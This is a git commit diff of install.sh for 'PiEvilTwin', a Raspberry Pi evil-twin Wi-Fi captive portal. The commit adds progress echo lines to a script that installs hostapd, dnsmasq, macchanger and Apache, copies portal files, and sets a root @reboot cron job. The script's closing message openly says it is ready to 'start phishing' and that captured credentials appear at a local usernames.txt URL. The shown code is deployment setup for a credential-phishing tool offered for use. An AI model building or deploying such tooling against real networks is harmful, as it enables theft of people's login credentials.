4761b9bdc14dc468608cc60e3300bbf802b24ea0
Nick Jongens <39074050+NickJongens@users.noreply.github.com>
2020-04-23 11:29:14 +1200

    Update install.sh

--- install.sh
+++ install.sh
@@ -9,19 +9,26 @@ echo "Installing dependencies..."
 apt-get install -y macchanger hostapd dnsmasq apache2 php
 
 echo "Configuring components..."
+echo "Setting up hostapd..."
 cp -f hostapd.conf /etc/hostapd/
+echo "Setting up dnsmasq..."
 cp -f dnsmasq.conf /etc/
+echo "Setting up HTML Files..."
 cp -Rf html /var/www/
 chown -R www-data:www-data /var/www/html
 chown root:www-data /var/www/html/.htaccess
+echo "Copying startup script..."
 cp -f PiEvilTwinStart.sh /root/
 crontab -l | { cat; echo "@reboot     sudo sleep 15 && sudo sh /root/PiEvilTwinStart.sh &"; } | crontab -
+echo "Setting up permissions..."
 chmod +x /root/PiEvilTwinStart.sh
+echo "Setting up Apache Config..."
 cp -f override.conf /etc/apache2/conf-available/
 cd /etc/apache2/conf-enabled
 ln -s ../conf-available/override.conf override.conf
 cd /etc/apache2/mods-enabled
 ln -s ../mods-available/rewrite.load rewrite.load
-
+echo "..."
+echo "..."
 echo "PiEvilTwin captive portal installed. Reboot and wait 15-20 seconds to start phishing. Credentials will be available here: http://10.1.1.1/usernames.txt"
 exit 0
